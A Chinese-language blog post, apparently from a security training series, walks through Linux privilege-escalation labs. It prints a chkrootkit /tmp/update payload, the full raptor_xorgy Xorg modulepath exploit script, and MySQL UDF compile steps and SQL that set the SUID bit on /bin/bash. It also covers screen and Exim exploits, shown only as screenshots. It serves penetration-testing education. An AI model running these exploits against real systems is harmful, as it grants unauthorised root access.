#  Linux提权系列14：[训练营] 利用存在漏洞的应用程序进行权限提升   
原创 debugeeker  奶牛安全   2023-04-08 08:14  
  
## 陨落的守护程序  
  
实验开始时，将获得一个低权限 shell，并且没有可疑的 SUID 二进制文件或 sudo 漏洞。当检查进程时，会看到一个脚本正在以 root 用户权限运行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTcGiclc9qsX5K679TMibKTf3ryBwAn5I45LByqiacfPQO3G4l3N9jCNnjEg/640?wx_fmt=png "")  
  
因为 当前用户可以读取它，所以可以看到它正在运行一些 rootkitchecker 程序。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTcjBMH2C77vzM5qiaY1mA5eQK17iaIfglEEGrYpOIvaw4wGTbFicEYtXpDA/640?wx_fmt=png "")  
  
rootkitchecker 的版本是 0.49，幸运的是它容易受到任意代码执行的攻击。该漏洞于 2014 年报告，分配给此漏洞的 CVE 为 CVE-2014-0476。  
  
漏洞：在 chkrootkit 文件中，slapper 函数没有对文件路径加引号，因此攻击者可以通过 chkrootkit 以 root 用户权限运行命令。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTcmbyBLqauXwEPEIyticIYzP1NY3woC6uV2ZyEFtkQV1kejkx2dJLGN1w/640?wx_fmt=png "")  
  
论文建议使用 /tmp/update 脚本，然后向其中添加恶意代码。文件 /tmp/update 将以 root 用户身份执行，因此如果文件中包含恶意内容，则可以有效地获得 root 权限。  
  
可以通过 netcat 获得 root 特权反向连接，但这里在 bash 上设置 suid 位，然后使用 bash -p -i 获得特权 bash  
```
cat > /tmp/update << EOF
#!/bin/bash
chmod +s /bin/bash
touch /tmp/done
EOF
chmod +x /tmp/update

```  
  
现在，等到看到 /tmp/done 文件。它什么都不做，只是用来检查命令是否被执行。  
  
几秒钟后，当命令再次运行时，就可以以 root 用户身份获取 bash 。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTcVphFS9j1Sljibicrj4mWxn3fnJyAmp6vGmTnReD5bVcEoboVDQzjlVdA/640?wx_fmt=png "")  
## 利用 X Windows 系统  
  
因此，根据描述，检查易受攻击的显示管理器并利用它已经公开的漏洞。  
  
枚举后会发现系统中安装了Xorg服务器，程序版本为1.19.5  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTcfSTW1siaKwVW1tTic3mSUgCTrQ2wiaqjufr749b3C9lNBDsqAsh2UQKJw/640?wx_fmt=png "")  
  
在google上搜索时，发现高版本的Xorg存在两个漏洞。有时，如果有一个小的版本变化，高版本存在的漏洞在低版本中也存在。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTcNkGplPMuQgEcrEMdhlzl9v0BylvBhH5u1btJg4Jld7od2K7QhE5kag/640?wx_fmt=png "")  
  
牢记这一点，尝试第一个漏洞利用。exploit 的 CVE 是 CVE-2018-14665。  
  
漏洞：1.20.3 之前的 Xorg-x11-server 不检查权限，允许非特权用户通过物理控制台登录系统以提升权限并以 root 用户权限运行任意命令。有两个易受攻击的攻击向量 -logpath 和 -modulepath。在此，在 Xorg 服务器中执行了库注入。  
  
将利用脚本保存在目标系统上  
```
#!/bin/bash
echo "raptor_xorgy - xorg-x11-server LPE via modulepath switch"
echo "Copyright (c) 2018 Marco Ivaldi <raptor@0xdeadbeef.info>"
echo

# prepare the payload
cat << EOF > /tmp/pwned.c
_init()
{
        setuid(0);
        setgid(0);
        system("/bin/bash");
}
EOF
# libglx.so should be a good target, refer to Xorg logs for other candidates
gcc -fPIC -shared -nostartfiles -w /tmp/pwned.c -o /tmp/libglx.so
if [ $? -ne 0 ]; then echo; echo "error: cannot compile /tmp/pwned.c"; exit; fi

# trigger the bug
echo "Got root?"
Xorg -modulepath ",/tmp" :1

```  
  
给脚本加执行权限并运行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTcunicqJgGYn6dZetau05yV3HtrOx2EMVLhuDOCLuZGzsLsXlqnzqrMZA/640?wx_fmt=png "")  
## 超级屏幕  
  
在之前的实验中，利用了一个易受攻击的桌面管理器服务 Xorg。在此，将了解易受攻击的窗口管理器如何导致权限提升。  
  
如果是 Linux 世界的新手并且对窗口管理器和桌面管理器感到困惑。窗口管理器负责管理应用程序窗口，例如：管理最小化状态并允许用户再次最大化窗口或添加处理程序以关闭、最小化和最大化按钮。另一方面，桌面管理器负责整个桌面用户体验，它提供面板、登录欢迎会话、菜单和您在系统中看到的所有内容。详情给https://askubuntu.com/questions/18078/what-is-the-difference-between-a-desktop-environment-and-a-window-manager#20435  
  
在枚举之后发现系统中安装了 screen 并且其版本在文件名称中公开  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTceIyTykgqYuMQruap3K6edKgfrlyU5It3alS8SsIPmG876dMo4OoZtw/640?wx_fmt=png "")  
  
看起来这是一个非常流行的漏洞。在搜索中，找到了该漏洞的第一个链接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTcwn600gaXHZicm5qvC0AOkB6HgjsYJSWP53ghEODqSBX4ajodDd9duqg/640?wx_fmt=png "")  
  
此漏洞没有分配 CVE。  
  
漏洞：可以通过启用 setuid 位的screen来滥用 ld.so.preload 覆盖获取root  shell。编译后的库将以 EUID 值为 0 运行，然后可以使用它来调用 setuid 函数并获得 root 特权 shell  
  
下载并执行漏洞脚本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTcowwWhXicUF7qciaLg4mtNZ6nUXhyupVx2ia5icEd9WQiaK5dXqMPdQz4RNQ/640?wx_fmt=png "")  
  
2> /dev/null 的使用是可选的。在这种情况下，使用它来避免在编译共享库时可能出现的回显警告  
## 突破数据库  
  
在本实验中，拥有以 root 用户权限运行的 MySQL 服务，并且提供了登录凭据  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTcGEXboAv3k8ld9C3wy6DdrdPGdKxbyu0d8oR93B1GgG75QVzHDOV58w/640?wx_fmt=png "")  
  
通过枚举，发现无法通过 sys_exec 函数执行命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTcAUEVqg6nibicSrXRxJK0RXxdJepibr0icumfCjzwriclcfG2OqGfFsluSmA/640?wx_fmt=png "")  
  
在进一步的枚举中，发现可以将库加载到 MySQL 中并像用户定义的函数一样执行它。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTctLYma1yOibvquDRxIYfvF1BqQ52rFCJxXQ5mqfUHquTZnchIsbIcCXQ/640?wx_fmt=png "")  
  
由于无法写入任何文件或插件目录内, 可以使用以上信息为MySQL编译shellcode。幸运的是，在 exploit-db 上发现了一个漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTcic5pI0SUXIGlupFRSpiaMBwD7p9mGP4kichUPWxzeBF9VI7gROxQOPP6A/640?wx_fmt=png "")  
  
下载 udf.c 文件并编译代码  
```
cd /tmp
gcc -g -c udf.c
gcc -g -shared -Wl,-soname,udf.so -o udf.so udf.o -lc

```  
  
现在以  MySQL 的root用户身份登录并使用 load_file 和 dumpfile 将文件 /tmp/udf.so 复制到 @@plugin_dir  
```
create table test(line blob); -- blob will allow us to store binary content
insert into test values(load_file('/tmp/udf.so')); -- here load_file function will read the content of file /tmp/udf.so and assign to line field
select * from test into dumpfile '/usr/lib/i386-linux-gnu/mariadb18/plugin/udf.so'; -- dump the content of row into file in @@plugin_dir
create function do_system returns integer soname 'udf.so'; -- load udf.so form @@plugin_dir and create function do_system
select * from func; -- verify udf function creation
select do_system('id'); -- verify udf function execution
select do_system('chmod +s /bin/bash'); -- add suid bit to /bin/bash

```  
  
评论仅供理解。可以在 MySQL 提示符下执行时省略它  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTcwO61zXLIG4GaiaasZia08h2WiardickwZK1TbHIcCABxcuy6IghLEmznHg/640?wx_fmt=png "")  
## 利用消息传输代理  
  
在此，了解到当目标应用程序以 root 权限运行时，用户输入中不正确的校验如何导致系统中的权限升级。  
  
在枚举易受攻击的应用程序时，发现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTckUwWyuDvOQ7cqic2sbiczlMs3ib4zsD5XDibFTX8kKfpfzl9lAzib65KrjQ/640?wx_fmt=png "")  
  
当列出 /usr/exim/bin 的内容时, 发现 Exim 版本是 4.89.2 并且可执行文件设置了 suid 位  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTccZPRiaOq4ImwkicEIoY6kibaYPibgDicoFTPPajDiajC60GVCK3MMzZo62tA/640?wx_fmt=png "")  
  
目标版本容易受到本地提权  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTcAnYMoBia45kqYIdpyQ4d1CKe7LmVlwGajvTZcv9iceSrUapSU8jnpHKQ/640?wx_fmt=png "")  
  
该漏洞被分配为 CVE-2019-10149。  
  
漏洞：/src/deliver.c 中的 deliver_message() 函数中收件人地址验证不当可能导致远程命令执行。  
  
按照exploit-db的指示下载并运行漏洞脚本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbxhekutsxDQQFeKazDwibibTcYDdywnSAUahbibLwdDGWWqwdnqnyXMT0G2wI7hw7E5iaCjdyRuV6mI6w/640?wx_fmt=png "")  
  
  
**请点一下右下角的“在看”，谢谢！！**  
  
****  
**暗号：133219**  
  
